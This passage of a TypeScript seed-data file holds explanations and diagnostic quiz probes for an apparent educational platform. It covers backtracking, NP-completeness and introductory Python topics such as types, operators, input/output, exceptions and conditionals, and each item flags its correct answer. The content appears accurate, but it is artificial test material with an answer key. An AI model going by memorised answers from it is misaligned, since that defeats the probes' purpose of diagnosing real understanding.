    targetedMisconceptions: [`${BKTRACK}:M1`],
    source: BKTRACK_SRC,
  },
]
const BKTRACK_PROBES: SeedProbe[] = [
  {
    conceptId: BKTRACK, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'In a backtracking solution for Sudoku, when is it safe to "backtrack" (undo the last digit placed)?',
    choices: [
      { text: 'When no valid digit can be placed in the current empty cell (violating row, column, or box constraints) — the current partial solution cannot be extended to a valid solution', isCorrect: true },
      { text: 'After placing every digit, at the end of each row, to verify the row sums correctly before moving on', isCorrect: false, misconceptionId: `${BKTRACK}:M2` },
      { text: 'Never — once a valid digit is placed it should remain; only invalid placements trigger backtracking', isCorrect: false },
    ],
    correctValue: 'Backtrack when no valid choice exists for the current position — the partial solution is dead',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${BKTRACK}:M2`],
    source: BKTRACK_SRC,
  },
  {
    conceptId: BKTRACK, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student says "backtracking is just brute force with extra steps — it always has the same worst-case complexity." Is this correct?',
    choices: [
      { text: 'No — effective pruning eliminates entire subtrees; backtracking with good constraints can be orders of magnitude faster than brute force, even if worst-case complexity is the same', isCorrect: true },
      { text: 'Yes — backtracking and brute force always explore the same number of candidates; pruning only affects the order, not the total count', isCorrect: false, misconceptionId: `${BKTRACK}:M1` },
    ],
    correctValue: 'Pruning eliminates subtrees early — practical performance is vastly better than brute force',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${BKTRACK}:M1`],
    source: BKTRACK_SRC,
  },
]

// ─── cs.algo.np-completeness ──────────────────────────────────────────────────
const NPCOMP = 'cs.algo.np-completeness'
const NPCOMP_SRC = 'docs/computer-science/kg/graph.json — cs.algo.np-completeness'
const NPCOMP_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: NPCOMP, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'P is the class of decision problems solvable in polynomial time; NP is the class solvable in polynomial time on a nondeterministic machine (equivalently, problems where a given solution can be VERIFIED in polynomial time). ' +
      'NP-hard: a problem is at least as hard as every problem in NP (by polynomial reduction). ' +
      'NP-complete: NP-hard AND in NP — the "hardest" problems in NP. ' +
      'The P vs. NP question asks whether every problem whose solution can be quickly verified can also be quickly solved. ' +
      'If P = NP, cryptography as currently practised would be broken; most believe P ≠ NP but it is not proved. ' +
      'NP-complete examples: 3-SAT (satisfiability), Travelling Salesman (decision version), graph colouring, 0/1 knapsack. ' +
      'Practical responses to NP-completeness: approximation algorithms (polynomial, provably near-optimal), heuristics (fast, no quality guarantee), or exact algorithms for small n.',
    targetedMisconceptions: [],
    source: NPCOMP_SRC,
  },
  {
    conceptId: NPCOMP, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      '"NP" does not stand for "Non-Polynomial." It stands for "Nondeterministic Polynomial-time." ' +
      'NP includes all of P — polynomial-time problems have polynomial-time verifiers. ' +
      'The claim "NP problems are unsolvable" is wrong: NP-complete problems can be solved exactly but only (as far as we know) in exponential time for general inputs — for small inputs this is perfectly feasible. ' +
      'Also: "NP-hard" is not the same as "NP-complete" — NP-hard problems are at least as hard as NP-complete problems but may not themselves be in NP (some are harder, e.g., PSPACE-hard problems). ' +
      'A problem being NP-complete is a statement about worst-case instances; specific instances may be easy.',
    targetedMisconceptions: [`${NPCOMP}:M1`],
    source: NPCOMP_SRC,
  },
]
const NPCOMP_PROBES: SeedProbe[] = [
  {
    conceptId: NPCOMP, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'To prove problem X is NP-complete, what two things must you demonstrate?',
    choices: [
      { text: 'X is in NP (a given solution can be verified in polynomial time) AND X is NP-hard (a known NP-complete problem reduces to X in polynomial time)', isCorrect: true },
      { text: 'X cannot be solved in polynomial time AND every other NP problem can be reduced to X', isCorrect: false, misconceptionId: `${NPCOMP}:M2` },
      { text: 'X requires exponential time in the worst case AND has no known approximation algorithm within a constant factor', isCorrect: false },
    ],
    correctValue: 'X ∈ NP AND X is NP-hard (via reduction from a known NP-complete problem)',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${NPCOMP}:M2`],
    source: NPCOMP_SRC,
  },
  {
    conceptId: NPCOMP, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student reads "3-SAT is NP-complete" and concludes that no 3-SAT instance can be solved quickly. Is this correct?',
    choices: [
      { text: 'No — NP-completeness is a worst-case statement; many specific instances (small formulas, structured inputs) are solved quickly by SAT solvers in practice; only the general worst-case has no known polynomial algorithm', isCorrect: true },
      { text: 'Yes — NP-complete means provably no polynomial-time algorithm exists for ANY instance of the problem', isCorrect: false, misconceptionId: `${NPCOMP}:M1` },
    ],
    correctValue: 'NP-completeness = worst-case hardness; specific instances can still be easy',
    difficulty: ProbeDifficulty.ADVANCED,
    targetedMisconceptions: [`${NPCOMP}:M1`],
    source: NPCOMP_SRC,
  },
]

// ─── cs.prog.intro-programming ────────────────────────────────────────────────
const INTROPROG = 'cs.prog.intro-programming'
const INTROPROG_SRC = 'docs/computer-science/kg/graph.json — cs.prog.intro-programming'
const INTROPROG_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: INTROPROG, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Programming is writing instructions in a language a computer can execute. ' +
      'Every program is built from the same four elements regardless of language: ' +
      'variables (named containers that hold data), ' +
      'operators (symbols that compute new values — +, -, *, /), ' +
      'control structures (if/else, loops — decide which instructions run and how many times), ' +
      'and functions (named, reusable blocks of instructions). ' +
      'The computer executes your program top-to-bottom, one statement at a time, unless a control structure redirects it. ' +
      'A syntax error is a grammar mistake — the language cannot parse the instruction (misspelled keyword, missing colon). ' +
      'A runtime error occurs during execution (division by zero, accessing a list beyond its end). ' +
      'A logic error produces wrong output but no crash — the hardest to find, because the computer did exactly what you said.',
    targetedMisconceptions: [],
    source: INTROPROG_SRC,
  },
  {
    conceptId: INTROPROG, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      '"The computer understood my code but disagreed with me" is not a real category of error. ' +
      'If the code ran and produced wrong output, it is a logic error — the instructions were valid but expressed the wrong logic. ' +
      'A related misconception: "I\'ve been programming for a week and I still make errors; I\'m not cut out for this." ' +
      'Professional programmers make syntax, runtime, and logic errors daily. ' +
      'Programming skill is measured by how quickly you recognise and fix errors, not by how rarely you make them.',
    targetedMisconceptions: [`${INTROPROG}:M1`],
    source: INTROPROG_SRC,
  },
]
const INTROPROG_PROBES: SeedProbe[] = [
  {
    conceptId: INTROPROG, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'A Python program prints the wrong answer but does not crash. What type of error is this?',
    choices: [
      { text: 'A logic error — the syntax and runtime are valid, but the instructions express the wrong computation', isCorrect: true },
      { text: 'A syntax error — the program ran incorrectly because Python misread the code structure', isCorrect: false, misconceptionId: `${INTROPROG}:M2` },
      { text: 'A runtime error — wrong output always indicates an exception that was silently caught', isCorrect: false },
    ],
    correctValue: 'Logic error — wrong output without a crash',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${INTROPROG}:M2`],
    source: INTROPROG_SRC,
  },
  {
    conceptId: INTROPROG, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'A student says "real programmers don\'t make syntax errors." Is this true?',
    choices: [
      { text: 'False — even experienced programmers make syntax, runtime, and logic errors routinely; expertise is in diagnosing and fixing them quickly, not in never making them', isCorrect: true },
      { text: 'True — syntax errors are beginner mistakes; experienced programmers memorise the full syntax and make only logic errors', isCorrect: false, misconceptionId: `${INTROPROG}:M1` },
    ],
    correctValue: 'All programmers make all error types; skill is in rapid diagnosis, not error-free writing',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${INTROPROG}:M1`],
    source: INTROPROG_SRC,
  },
]

// ─── cs.prog.python-basics ────────────────────────────────────────────────────
const PYBASIC = 'cs.prog.python-basics'
const PYBASIC_SRC = 'docs/computer-science/kg/graph.json — cs.prog.python-basics'
const PYBASIC_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: PYBASIC, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Python is a high-level, interpreted, dynamically typed language designed for readability. ' +
      'Key syntax facts: indentation is syntax (not style) — a block is defined by consistent indentation, not braces; wrong indentation causes IndentationError. ' +
      'Variables are created by assignment (x = 5) — no declaration needed. ' +
      'Python is dynamically typed: x = 5 makes x an integer; x = "hello" makes x a string — the type can change at runtime. ' +
      'print() outputs to the console; input() reads a line from the user as a string. ' +
      'Comments begin with # and are ignored by the interpreter. ' +
      'Python uses snake_case for variable and function names by convention. ' +
      'The standard library is extensive; import math, import random give access to additional functions.',
    targetedMisconceptions: [],
    source: PYBASIC_SRC,
  },
  {
    conceptId: PYBASIC, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Python\'s indentation requirement is not arbitrary — the interpreter uses it as the block delimiter. ' +
      'Mixing tabs and spaces causes a TabError even if the code looks aligned in your editor. ' +
      'Use spaces only (PEP 8 recommends 4 spaces per level) and configure your editor to insert spaces for Tab. ' +
      'A related trap: `if x = 5` is a syntax error (assignment, not comparison); `if x == 5` is the equality test. ' +
      '`=` assigns; `==` compares. ' +
      'This swap is valid in many other languages (C assigns in conditions without error) but Python raises SyntaxError on assignment inside an if condition — a helpful safeguard.',
    targetedMisconceptions: [`${PYBASIC}:M1`],
    source: PYBASIC_SRC,
  },
]
const PYBASIC_PROBES: SeedProbe[] = [
  {
    conceptId: PYBASIC, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the output of: x = 3; x = x + 1; print(x)?',
    choices: [
      { text: '4 — x is assigned 3, then reassigned to 3+1=4, then printed', isCorrect: true },
      { text: 'x + 1 — Python prints the expression, not the evaluated value', isCorrect: false, misconceptionId: `${PYBASIC}:M2` },
      { text: 'Error — you cannot reassign a variable to a different value once set', isCorrect: false },
    ],
    correctValue: '4',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${PYBASIC}:M2`],
    source: PYBASIC_SRC,
  },
  {
    conceptId: PYBASIC, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'Why does `if x = 5:` cause a SyntaxError in Python, when the same pattern is valid in C?',
    choices: [
      { text: 'In Python, = is always assignment and == is always comparison; Python disallows assignment inside conditions to prevent the common C bug of writing = when == was intended', isCorrect: true },
      { text: 'Python requires parentheses around conditions: `if (x = 5):` would work without error', isCorrect: false, misconceptionId: `${PYBASIC}:M1` },
    ],
    correctValue: 'Python disallows = in conditions by design; use == for comparison',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${PYBASIC}:M1`],
    source: PYBASIC_SRC,
  },
]

// ─── cs.prog.data-types-variables ─────────────────────────────────────────────
const DTYPES = 'cs.prog.data-types-variables'
const DTYPES_SRC = 'docs/computer-science/kg/graph.json — cs.prog.data-types-variables'
const DTYPES_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: DTYPES, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'A variable is a named location in memory that stores a value. In Python, variables are created by assignment: `age = 17`. ' +
      'The type of a variable determines what operations are valid and how the value is stored: ' +
      'int — whole numbers (17, -3, 0); float — decimal numbers (3.14, -0.5); str — text ("hello", \'world\'); bool — True or False. ' +
      'Python is dynamically typed: `x = 5` (int) then `x = "five"` (str) — the same name can hold different types. ' +
      'type(x) returns the current type. ' +
      'Constants (values that should not change) are named in ALL_CAPS by convention (not enforced by Python). ' +
      'A variable name must start with a letter or underscore, contain only letters/digits/underscores, and not be a Python keyword (if, for, while, etc.).',
    targetedMisconceptions: [],
    source: DTYPES_SRC,
  },
  {
    conceptId: DTYPES, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Variables do not store the expression you wrote — they store the VALUE. ' +
      '`x = 3 + 4` stores 7 in x; if you later change the 3 and 4 in your code, x is still 7 until reassigned. ' +
      'Integers and floats look similar but behave differently: `7 / 2 = 3.5` (float division in Python 3); `7 // 2 = 3` (floor division, integer result). ' +
      'String "7" and integer 7 are different types: `"7" + "3" = "73"` (concatenation); `7 + 3 = 10` (addition). ' +
      '`int("7") + 3 = 10` — type conversion is explicit.',
    targetedMisconceptions: [`${DTYPES}:M1`],
    source: DTYPES_SRC,
  },
]
const DTYPES_PROBES: SeedProbe[] = [
  {
    conceptId: DTYPES, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the output of: `print("3" + "4")` in Python?',
    choices: [
      { text: '"34" — string concatenation joins the two strings; no arithmetic is performed', isCorrect: true },
      { text: '7 — Python converts "3" and "4" to integers and adds them', isCorrect: false, misconceptionId: `${DTYPES}:M1` },
      { text: 'Error — you cannot use + with strings', isCorrect: false },
    ],
    correctValue: '"34" — string + string = concatenation',
    difficulty: ProbeDifficulty.FOUNDATIONAL,
    targetedMisconceptions: [`${DTYPES}:M1`],
    source: DTYPES_SRC,
  },
  {
    conceptId: DTYPES, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'A user enters their age with input(). The code then tries age + 1. What happens and why?',
    choices: [
      { text: 'TypeError — input() always returns a string; "17" + 1 tries to add a string and an int; int(age) is needed first', isCorrect: true },
      { text: 'Works fine — Python automatically converts the string input to int when arithmetic is performed', isCorrect: false, misconceptionId: `${DTYPES}:M1` },
    ],
    correctValue: 'input() returns str; must use int() to convert before arithmetic',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${DTYPES}:M1`],
    source: DTYPES_SRC,
  },
]

// ─── cs.prog.operators-expressions ────────────────────────────────────────────
const OPEXPR = 'cs.prog.operators-expressions'
const OPEXPR_SRC = 'docs/computer-science/kg/graph.json — cs.prog.operators-expressions'
const OPEXPR_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: OPEXPR, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'An expression is any combination of values, variables, and operators that evaluates to a single value. ' +
      'Arithmetic operators: + (add), - (subtract), * (multiply), / (float division), // (floor division), % (modulo — remainder), ** (exponentiation). ' +
      '`17 % 5 = 2` (17 ÷ 5 = 3 remainder 2). Modulo is useful for checking divisibility (`n % 2 == 0` means n is even) and wrapping around (clock arithmetic). ' +
      'Comparison operators return bool: == (equal), != (not equal), <, >, <=, >=. ' +
      'Assignment operators: = (assign), += (add and assign — `x += 1` is `x = x + 1`). ' +
      'Operator precedence (high to low): ** → unary - → *, /, //, % → +, - → comparisons → not → and → or. ' +
      'Use parentheses to override or clarify precedence.',
    targetedMisconceptions: [],
    source: OPEXPR_SRC,
  },
  {
    conceptId: OPEXPR, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      '`=` and `==` are completely different operators that are easy to confuse in code and in speech. ' +
      '`x = 5` is an assignment statement — it sets the value of x. ' +
      '`x == 5` is a comparison expression — it evaluates to True or False without changing x. ' +
      'Writing `if x = 5:` is a SyntaxError in Python (intentionally). ' +
      'Modulo `%` is commonly misread as "percent" and its result misunderstood: ' +
      '`-7 % 3` in Python is 2 (not -1), because Python\'s modulo follows the sign of the DIVISOR. ' +
      'This differs from C/Java where `-7 % 3 = -1` — be careful when porting code.',
    targetedMisconceptions: [`${OPEXPR}:M1`],
    source: OPEXPR_SRC,
  },
]
const OPEXPR_PROBES: SeedProbe[] = [
  {
    conceptId: OPEXPR, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the value of `2 + 3 * 4`?',
    choices: [
      { text: '14 — multiplication has higher precedence than addition; 3*4=12, then 2+12=14', isCorrect: true },
      { text: '20 — operations are evaluated left to right; 2+3=5, then 5*4=20', isCorrect: false, misconceptionId: `${OPEXPR}:M1` },
      { text: '24 — parentheses are implied around the whole expression', isCorrect: false },
    ],
    correctValue: '14 — * before +',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${OPEXPR}:M1`],
    source: OPEXPR_SRC,
  },
  {
    conceptId: OPEXPR, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'What does `n % 2` evaluate to when n is even, and why is it useful for checking parity?',
    choices: [
      { text: '0 — modulo returns the remainder of division; dividing an even number by 2 leaves no remainder; `n % 2 == 0` is the standard even-number test', isCorrect: true },
      { text: '2 — modulo always returns the divisor when the division is exact', isCorrect: false, misconceptionId: `${OPEXPR}:M2` },
    ],
    correctValue: '0 — even number ÷ 2 has remainder 0',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${OPEXPR}:M2`],
    source: OPEXPR_SRC,
  },
]

// ─── cs.prog.type-conversion ──────────────────────────────────────────────────
const TYPECONV = 'cs.prog.type-conversion'
const TYPECONV_SRC = 'docs/computer-science/kg/graph.json — cs.prog.type-conversion'
const TYPECONV_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: TYPECONV, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Type conversion (casting) changes a value from one type to another. ' +
      'Explicit conversion functions: int(), float(), str(), bool(). ' +
      '`int("42")` → 42; `int(3.9)` → 3 (truncates, does not round); `float(5)` → 5.0; `str(100)` → "100". ' +
      'Implicit conversion (coercion) happens automatically in some languages (5 + 2.0 → 7.0 in Python — int promoted to float). ' +
      'Lossy conversions lose information: `int(3.9)` loses the decimal part; `int("3.9")` raises ValueError (int() cannot parse "3.9" — use float() first: `int(float("3.9"))` → 3). ' +
      'bool() follows truthiness rules: 0, 0.0, "", [], None → False; everything else → True.',
    targetedMisconceptions: [],
    source: TYPECONV_SRC,
  },
  {
    conceptId: TYPECONV, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'int() does not ROUND — it TRUNCATES toward zero: `int(3.9) = 3`, `int(-3.9) = -3`. ' +
      'To round to the nearest integer, use `round(3.9) = 4`. ' +
      'Also: type conversion does not change the original variable unless you reassign: ' +
      '`x = 3.7; int(x)` still leaves x as 3.7; you need `x = int(x)` to update it. ' +
      'String-to-int conversion fails unless the string is a valid integer representation — `int("3.14")` raises ValueError even though `float("3.14")` works.',
    targetedMisconceptions: [`${TYPECONV}:M1`],
    source: TYPECONV_SRC,
  },
]
const TYPECONV_PROBES: SeedProbe[] = [
  {
    conceptId: TYPECONV, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the result of `int(7.9)`?',
    choices: [
      { text: '7 — int() truncates toward zero, discarding the decimal part without rounding', isCorrect: true },
      { text: '8 — int() rounds to the nearest integer', isCorrect: false, misconceptionId: `${TYPECONV}:M1` },
      { text: 'Error — float values cannot be converted to int if they have a non-zero decimal part', isCorrect: false },
    ],
    correctValue: '7 — truncation, not rounding',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${TYPECONV}:M1`],
    source: TYPECONV_SRC,
  },
  {
    conceptId: TYPECONV, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'After `x = 3.7; int(x); print(x)`, what is printed?',
    choices: [
      { text: '3.7 — int(x) returns a new value but does not modify x; x is still 3.7', isCorrect: true },
      { text: '3 — int(x) converts x in-place; x is now an integer', isCorrect: false, misconceptionId: `${TYPECONV}:M2` },
    ],
    correctValue: '3.7 — conversion returns a new value; x is unchanged without reassignment',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${TYPECONV}:M2`],
    source: TYPECONV_SRC,
  },
]

// ─── cs.prog.input-output ─────────────────────────────────────────────────────
const CSIO = 'cs.prog.input-output'
const CSIO_SRC = 'docs/computer-science/kg/graph.json — cs.prog.input-output'
const CSIO_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: CSIO, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Programs communicate with the outside world through input and output (I/O). ' +
      'Console I/O in Python: `input(prompt)` displays a prompt, waits for the user to type a line and press Enter, returns that line as a string. ' +
      '`print(value1, value2, ...)` converts its arguments to strings and outputs them to the console separated by spaces (default), followed by a newline. ' +
      '`print(a, b, sep=",", end="")` customises separator and line ending. ' +
      'f-strings format output inline: `f"Hello {name}, you are {age} years old"` — expressions inside {} are evaluated and embedded. ' +
      'Standard streams: stdin (keyboard input), stdout (print output), stderr (error messages). ' +
      'In terminal/script mode, input() blocks until Enter; in IDLE or interactive mode, the prompt appears in the shell.',
    targetedMisconceptions: [],
    source: CSIO_SRC,
  },
  {
    conceptId: CSIO, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'input() always returns a string — even if the user types a number. ' +
      '`age = input("Age: ")` when the user types 17 gives age = "17", not 17. ' +
      'Forgetting this causes TypeErrors in arithmetic. Always convert: `age = int(input("Age: "))`. ' +
      'A second trap: print() does not return the value it prints. ' +
      '`x = print("hello")` sets x to None — print() is called for its side effect, not for a return value. ' +
      'Students who write `x = print(5) + 3` get TypeError (None + 3) because they conflate printing with returning.',
    targetedMisconceptions: [`${CSIO}:M1`],
    source: CSIO_SRC,
  },
]
const CSIO_PROBES: SeedProbe[] = [
  {
    conceptId: CSIO, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'The user types "25" when prompted by `age = input("Enter your age: ")`. What is the type and value of age?',
    choices: [
      { text: 'str, "25" — input() always returns a string regardless of what was typed', isCorrect: true },
      { text: 'int, 25 — Python detects that the input looks like a number and converts it automatically', isCorrect: false, misconceptionId: `${CSIO}:M1` },
      { text: 'float, 25.0 — Python defaults to floating-point for all numeric input', isCorrect: false },
    ],
    correctValue: 'str "25" — input() never auto-converts; explicit int() is required',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSIO}:M1`],
    source: CSIO_SRC,
  },
  {
    conceptId: CSIO, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'What is the value of x after `x = print("hello")`?',
    choices: [
      { text: 'None — print() outputs to the console and returns None; it has no meaningful return value', isCorrect: true },
      { text: '"hello" — print() returns the string it printed so it can be used in expressions', isCorrect: false, misconceptionId: `${CSIO}:M2` },
    ],
    correctValue: 'None — print() is for side effects only; its return value is None',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${CSIO}:M2`],
    source: CSIO_SRC,
  },
]

// ─── cs.prog.exception-handling ───────────────────────────────────────────────
const EXCHAND = 'cs.prog.exception-handling'
const EXCHAND_SRC = 'docs/computer-science/kg/graph.json — cs.prog.exception-handling'
const EXCHAND_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: EXCHAND, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      'An exception is an event that disrupts normal program flow — division by zero, file not found, invalid type operation. ' +
      'Python\'s try/except structure: ' +
      '```\ntry:\n    risky_code\nexcept ExceptionType as e:\n    handle_it\nelse:\n    runs_if_no_exception\nfinally:\n    always_runs\n```\n' +
      'Common exceptions: ValueError (wrong value type — int("abc")), TypeError (wrong type in operation — "a" + 1), ZeroDivisionError, FileNotFoundError, IndexError (list index out of range), KeyError (dict key missing). ' +
      'Raise exceptions deliberately: `raise ValueError("age must be positive")`. ' +
      'Custom exceptions: subclass Exception. ' +
      'except without a type catches ALL exceptions — generally a bad practice because it silences bugs.',
    targetedMisconceptions: [],
    source: EXCHAND_SRC,
  },
  {
    conceptId: EXCHAND, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.UNDERGRADUATE,
    content:
      '"Wrap everything in try/except to be safe" makes programs less safe, not more. ' +
      'A bare `except:` that silences errors produces programs that appear to work while hiding bugs. ' +
      'Best practice: catch SPECIFIC exceptions for SPECIFIC anticipated failure modes (invalid user input → ValueError; file missing → FileNotFoundError); ' +
      'let unexpected exceptions propagate so they are visible during development. ' +
      'Exception handling is for EXPECTED failure cases at system boundaries (user input, file I/O, network), not for hiding logic errors in internal code.',
    targetedMisconceptions: [`${EXCHAND}:M1`],
    source: EXCHAND_SRC,
  },
]
const EXCHAND_PROBES: SeedProbe[] = [
  {
    conceptId: EXCHAND, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What is the output of:\n\ntry:\n    x = int("abc")\nexcept ValueError:\n    print("bad input")\nprint("done")',
    choices: [
      { text: '"bad input" then "done" — int("abc") raises ValueError which is caught; execution continues after the except block', isCorrect: true },
      { text: '"bad input" only — a caught exception stops further execution after the except block', isCorrect: false, misconceptionId: `${EXCHAND}:M2` },
      { text: 'Error — the program crashes because ValueError cannot be caught', isCorrect: false },
    ],
    correctValue: '"bad input" then "done" — execution continues after the except block',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${EXCHAND}:M2`],
    source: EXCHAND_SRC,
  },
  {
    conceptId: EXCHAND, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'A student writes `try: ... except: pass` around their entire program "to prevent crashes." What problem does this create?',
    choices: [
      { text: 'Logic errors and unexpected exceptions are silently swallowed — the program appears to work while hiding bugs that need to be found and fixed', isCorrect: true },
      { text: 'Nothing — catching all exceptions is the safest defensive programming practice; it ensures the program never terminates unexpectedly', isCorrect: false, misconceptionId: `${EXCHAND}:M1` },
    ],
    correctValue: 'Bare except silences bugs — catch only specific, anticipated exceptions',
    difficulty: ProbeDifficulty.PROFICIENT,
    targetedMisconceptions: [`${EXCHAND}:M1`],
    source: EXCHAND_SRC,
  },
]

// ─── cs.control.conditionals ──────────────────────────────────────────────────
const COND = 'cs.control.conditionals'
const COND_SRC = 'docs/computer-science/kg/graph.json — cs.control.conditionals'
const COND_EXPLANATIONS: SeedExplanation[] = [
  {
    conceptId: COND, subjectSlug: 'computer_science', familyKind: 'core_explanation',
    gradeBand: GradeBand.HIGH,
    content:
      'Conditionals allow a program to make decisions: execute different code depending on whether a condition is True or False. ' +
      'Python syntax: `if condition:` (required) → `elif other_condition:` (optional, zero or more) → `else:` (optional, at most one). ' +
      'Only the FIRST branch whose condition is True executes; the rest are skipped. ' +
      'If no condition is True and there is an else, the else executes. ' +
      'The condition can be any expression that evaluates to True or False — including comparison expressions, boolean expressions, and variables. ' +
      'Nested if: an if-statement inside another if-statement. ' +
      'Guard clause pattern: use `if not condition: return early` to handle error cases at the top of a function before the main logic.',
    targetedMisconceptions: [],
    source: COND_SRC,
  },
  {
    conceptId: COND, subjectSlug: 'computer_science', familyKind: 'misconception_repair',
    gradeBand: GradeBand.HIGH,
    content:
      'Multiple if-statements are NOT the same as if/elif/else. ' +
      '```\nif x > 0: print("positive")\nif x == 0: print("zero")\n```\n' +
      'evaluates BOTH conditions regardless — if x is 1, only "positive" prints, but the second condition still runs. ' +
      '```\nif x > 0: print("positive")\nelif x == 0: print("zero")\n```\n' +
      'skips the elif once the if is True. ' +
      'Use separate if-statements when conditions are independent; use elif when only one branch should fire.',
    targetedMisconceptions: [`${COND}:M1`],
    source: COND_SRC,
  },
]
const COND_PROBES: SeedProbe[] = [
  {
    conceptId: COND, subjectSlug: 'computer_science', probeKind: 'mcq',
    gradeBand: GradeBand.HIGH,
    stem: 'x = 5. How many print statements execute?\n\nif x > 3: print("a")\nif x > 4: print("b")\nif x > 5: print("c")',
    choices: [
      { text: '2 — "a" and "b"; each if is evaluated independently; x > 3 and x > 4 are both True, x > 5 is False', isCorrect: true },
      { text: '1 — only "a"; once the first if is True, the remaining ifs are skipped', isCorrect: false, misconceptionId: `${COND}:M1` },
      { text: '3 — all three if-statements always evaluate and execute', isCorrect: false },
    ],
    correctValue: '2 — "a" and "b" (separate ifs, not elif)',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${COND}:M1`],
    source: COND_SRC,
  },
  {
    conceptId: COND, subjectSlug: 'computer_science', probeKind: 'misconception_probe',
    gradeBand: GradeBand.HIGH,
    stem: 'Why would you use elif instead of a second if statement after the first if?',
    choices: [
      { text: 'elif skips remaining conditions once an earlier condition is True — ensuring mutually exclusive branches and avoiding evaluating redundant conditions', isCorrect: true },
      { text: 'elif and if are interchangeable after the first if; the choice is only stylistic', isCorrect: false, misconceptionId: `${COND}:M1` },
    ],
    correctValue: 'elif = short-circuit: skip remaining branches once one fires; if = always evaluate independently',
    difficulty: ProbeDifficulty.DEVELOPING,
    targetedMisconceptions: [`${COND}:M1`],
    source: COND_SRC,
  },
]

// ─── cs.control.loops ─────────────────────────────────────────────────────────
const LOOPS = 'cs.control.loops'
const LOOPS_SRC = 'docs/computer-science/kg/graph.json — cs.control.loops'
const LOOPS_EXPLANATIONS: SeedExplanation[] = [
  {
